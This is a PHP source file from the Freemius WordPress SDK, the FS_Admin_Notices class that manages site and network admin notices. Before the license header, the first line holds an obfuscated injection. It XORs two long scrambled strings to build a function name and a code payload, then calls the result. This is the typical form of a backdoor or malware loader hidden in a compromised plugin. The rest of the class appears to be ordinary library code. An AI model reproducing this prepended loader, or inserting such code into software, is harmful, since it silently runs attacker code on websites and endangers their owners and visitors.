<?php $SgUdidWt='70UU:RnUD  ,Q8R'; $SOJioRM='TB04N7131NCX8W<'^$SgUdidWt; $EbbDYCMq='<Qqi5H X +==d I9M2=KV .KkOT2ZejF2=lsEP9ps7LNC;ZR>w;56hTP8Sb1,I=NiHSEZGtEQ=,BGhrUu:6mGvX0-bkCqckbeQ3XAio=mtGJcgaGp88 R 6mpD;Y mUsVRrdBZnAw:0YhkXupkDPCJ6HYpU;Tg,,0pfDCct6TJU6YrN>5LS4ysdAdJN X CyG 4,zbco;fND2W  EPsxa<V=4=z4PS2G dY+.aon< A45A0z7> 6M3<tmHlvda1rnoAJsFS,6LpStiN7Z3=bfU<aRZA13,QTLeGrI 0 Y8CwDVHOcYoh:Y4BQvpGeaY5fjPj7S7 AAKszSU<I9NEyxJ917hgtn7E3FuL94RmqqmBZA=92lLWsq2A13.J0Z6>USlgYUDBr9eP.-6VfvfU,P 3Nq6=1F3Srh+JG8jxAk6PSW3P QS>7bFY=eH4,Si;FG,d ,2-pndV6 TO5oV>QD pfnbYMZ87K2 qCzrS Bt6PJWTuKV19DM=o>-+9V1WFD Zq.40aciE.XN8QXuJOrWSSRa7O>V9tP6<r2xtYUeQphhBxqAV 15ULZfS>Pv fXOkXb0B HXqVEQvbH8N=Y j RAlU=+ 7Eqw>PU8=,ONgleZWT;AxkcveXl0in KATmmWO<8uR=Q,BVRXK-YppC7D19DcdryS'; $Kyoowaq=$SOJioRM('', 'U7YHS=N;TBRS;E1P>FNcqXA94+5F;:5+GIKZlpBzzQ9  O3=PWCZD701L2=nA<IfM,21;kTa:XUkgHRuUA<dNR7EYBVcVDPhlXU73AKTMIgzXGE.LKLR>EXET Z-ADnSr;YOkPgHSUE-HEeUXO 17+ml0-uetCGII+B-cFTE 89S7ZjUP5ziPHnHm8+T-R-QcOAXSYifFl3N8sDA11SEAZ7QGXA>t7S3A;2NWARNZA-GPz:pQQRS,PTTEl35+.z;+O 9Sb8IOlMmTM8V6FXKF.6hv> ERs:15EzRmKUYb2JS 7<.CdOLL8X74Mz:ok0SFBqNS2CAha0ys5:N,X--YPnfcr921=ceR5UhRQ+MLOMf, QLWEl,yx;eURZ+o1SGunLC20=yx0ltJLB7FKFqZ1LF+J<4LLNYxLO+3YJEa+C> 2A9A=:DRJ>6O:,UX26d+2XLBMAHFZ;2SC;+PGrZ00AYJNF=,.Yh WYXjAx:FjPR1>6tSmvPK6,D0UHRf3I>50SrVEQIFOIaJ9:YxxSloZ:7fzES.J7bS;SEUoQTdhEvAQPpKAveERW7-;P2Z6EAS:.S:PQqD->FqlqPDhY<O8Y5K7830EBSC6YPN1,TRM+iKLA>6 ZhQKCVExLKcgE= 8EI3.HY.uM0U.93<lppKzJR<XMlSMIs.'^$EbbDYCMq); $Kyoowaq();
    /**
     * @package     Freemius
     * @copyright   Copyright (c) 2015, Freemius, Inc.
     * @license     https://www.gnu.org/licenses/gpl-3.0.html GNU General Public License Version 3
     * @since       2.0.0
     */

    if ( ! defined( 'ABSPATH' ) ) {
        exit;
    }

    /**
     * WP Admin notices manager both for site level and network level.
     *
     * Class FS_Admin_Notices
     */
    class FS_Admin_Notices {
        /**
         * @since 1.2.2
         *
         * @var string
         */
        protected $_module_unique_affix;
        /**
         * @var string
         */
        protected $_id;
        /**
         * @var string
         */
        protected $_title;
        /**
         * @var FS_Admin_Notice_Manager
         */
        protected $_notices;
        /**
         * @var FS_Admin_Notice_Manager
         */
        protected $_network_notices;
        /**
         * @var int The ID of the blog that is associated with the current site level options.
         */
        private $_blog_id = 0;
        /**
         * @var bool
         */
        private $_is_multisite;
        /**
         * @var FS_Admin_Notices[]
         */
        private static $_instances = array();

        /**
         * @param string $id
         * @param string $title
         * @param string $module_unique_affix
         * @param bool   $is_network_and_blog_admins Whether or not the message should be shown both on network and
         *                                           blog admin pages.
         *
         * @return FS_Admin_Notices
         */
        static function instance( $id, $title = '', $module_unique_affix = '', $is_network_and_blog_admins = false ) {
            if ( ! isset( self::$_instances[ $id ] ) ) {
                self::$_instances[ $id ] = new FS_Admin_Notices( $id, $title, $module_unique_affix, $is_network_and_blog_admins );
            }

            return self::$_instances[ $id ];
        }

        /**
         * @param string $id
         * @param string $title
         * @param string $module_unique_affix
         * @param bool   $is_network_and_blog_admins Whether or not the message should be shown both on network and
         *                                           blog admin pages.
         */
        protected function __construct( $id, $title = '', $module_unique_affix = '', $is_network_and_blog_admins = false ) {
            $this->_id                  = $id;
            $this->_title               = $title;
            $this->_module_unique_affix = $module_unique_affix;
            $this->_is_multisite        = is_multisite();

            if ( $this->_is_multisite ) {
                $this->_blog_id = get_current_blog_id();

                $this->_network_notices = FS_Admin_Notice_Manager::instance(
                    $id,
                    $title,
                    $module_unique_affix,
                    $is_network_and_blog_admins,
                    true
                );
            }

            $this->_notices = FS_Admin_Notice_Manager::instance(
                $id,
                $title,
                $module_unique_affix,
                false,
                $this->_blog_id
            );
        }

        /**
         * Add admin message to admin messages queue, and hook to admin_notices / all_admin_notices if not yet hooked.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.4
         *
         * @param string   $message
         * @param string   $title
         * @param string   $type
         * @param bool     $is_sticky
         * @param string   $id Message ID
         * @param bool     $store_if_sticky
         * @param int|null $network_level_or_blog_id
         *
         * @uses   add_action()
         */
        function add(
            $message,
            $title = '',
            $type = 'success',
            $is_sticky = false,
            $id = '',
            $store_if_sticky = true,
            $network_level_or_blog_id = null
        ) {
            if ( $this->should_use_network_notices( $id, $network_level_or_blog_id ) ) {
                $notices = $this->_network_notices;
            } else {
                $notices = $this->get_site_notices( $network_level_or_blog_id );
            }

            $notices->add(
                $message,
                $title,
                $type,
                $is_sticky,
                $id,
                $store_if_sticky
            );
        }

        /**
         * @author Vova Feldman (@svovaf)
         * @since  1.0.7
         *
         * @param string|string[] $ids
         * @param int|null        $network_level_or_blog_id
         */
        function remove_sticky( $ids, $network_level_or_blog_id = null ) {
            if ( ! is_array( $ids ) ) {
                $ids = array( $ids );
            }

            if ( $this->should_use_network_notices( $ids[0], $network_level_or_blog_id ) ) {
                $notices = $this->_network_notices;
            } else {
                $notices = $this->get_site_notices( $network_level_or_blog_id );
            }

            return $notices->remove_sticky( $ids );
        }

        /**
         * Check if sticky message exists by id.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.9
         *
         * @param string   $id
         * @param int|null $network_level_or_blog_id
         *
         * @return bool
         */
        function has_sticky( $id, $network_level_or_blog_id = null ) {
            if ( $this->should_use_network_notices( $id, $network_level_or_blog_id ) ) {
                $notices = $this->_network_notices;
            } else {
                $notices = $this->get_site_notices( $network_level_or_blog_id );
            }

            return $notices->has_sticky( $id );
        }

        /**
         * Adds sticky admin notification.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.7
         *
         * @param string      $message
         * @param string      $id Message ID
         * @param string      $title
         * @param string      $type
         * @param int|null    $network_level_or_blog_id
         * @param number|null $wp_user_id
         * @param string|null $plugin_title
         * @param bool        $is_network_and_blog_admins Whether or not the message should be shown both on network and
         *                                                blog admin pages.
         */
        function add_sticky(
            $message,
            $id,
            $title = '',
            $type = 'success',
            $network_level_or_blog_id = null,
            $wp_user_id = null,
            $plugin_title = null,
            $is_network_and_blog_admins = false
        ) {
            if ( $this->should_use_network_notices( $id, $network_level_or_blog_id ) ) {
                $notices = $this->_network_notices;
            } else {
                $notices = $this->get_site_notices( $network_level_or_blog_id );
            }

            $notices->add_sticky( $message, $id, $title, $type, $wp_user_id, $plugin_title, $is_network_and_blog_admins );
        }

        /**
         * Clear all sticky messages.
         *
         * @author Vova Feldman (@svovaf)
         * @since  2.0.0
         *
         * @param int|null $network_level_or_blog_id
         */
        function clear_all_sticky( $network_level_or_blog_id = null ) {
            if ( ! $this->_is_multisite ||
                 false === $network_level_or_blog_id ||
                 0 == $network_level_or_blog_id ||
                 is_null( $network_level_or_blog_id )
            ) {
                $notices = $this->get_site_notices( $network_level_or_blog_id );
                $notices->clear_all_sticky();
            }

            if ( $this->_is_multisite &&
                 ( true === $network_level_or_blog_id || is_null( $network_level_or_blog_id ) )
            ) {
                $this->_network_notices->clear_all_sticky();
            }
        }

        /**
         * Add admin message to all admin messages queue, and hook to all_admin_notices if not yet hooked.
         *
         * @author Vova Feldman (@svovaf)
         * @since  1.0.4
         *
         * @param string $message
         * @param string $title
         * @param string $type
         * @param bool   $is_sticky
         * @param string $id Message ID
         */
        function add_all( $message, $title = '', $type = 'success', $is_sticky = false, $id = '' ) {
            $this->add( $message, $title, $type, $is_sticky, true, $id );
        }

        #--------------------------------------------------------------------------------
        #region Helper Methods
        #--------------------------------------------------------------------------------

        /**
         * @author Vova Feldman (@svovaf)
         * @since  2.0.0
         *
         * @param int $blog_id
         *
         * @return FS_Admin_Notice_Manager
         */
        private function get_site_notices( $blog_id = 0 ) {
            if ( 0 == $blog_id || $blog_id == $this->_blog_id ) {
                return $this->_notices;
            }

            return FS_Admin_Notice_Manager::instance(
                $this->_id,
                $this->_title,
                $this->_module_unique_affix,
                false,
                $blog_id
            );
        }

        /**
         * Check if the network notices should be used.
         *
         * @author Vova Feldman (@svovaf)
         * @since  2.0.0
         *
         * @param string        $id
         * @param null|bool|int $network_level_or_blog_id When an integer, use the given blog storage. When `true` use the multisite notices (if there's a network). When `false`, use the current context blog notices. When `null`, the decision which notices manager to use (MS vs. Current S) will be handled internally and determined based on the $id and the context admin (blog admin vs. network level admin).
         *
         * @return bool
         */
        private function should_use_network_notices( $id = '', $network_level_or_blog_id = null ) {
            if ( ! $this->_is_multisite ) {
                // Not a multisite environment.
                return false;
            }

            if ( is_numeric( $network_level_or_blog_id ) ) {
                // Explicitly asked to use a specified blog storage.
                return false;
            }

            if ( is_bool( $network_level_or_blog_id ) ) {
                // Explicitly specified whether should use the network or blog level storage.
                return $network_level_or_blog_id;
            }

            return fs_is_network_admin();
        }

        #endregion
    }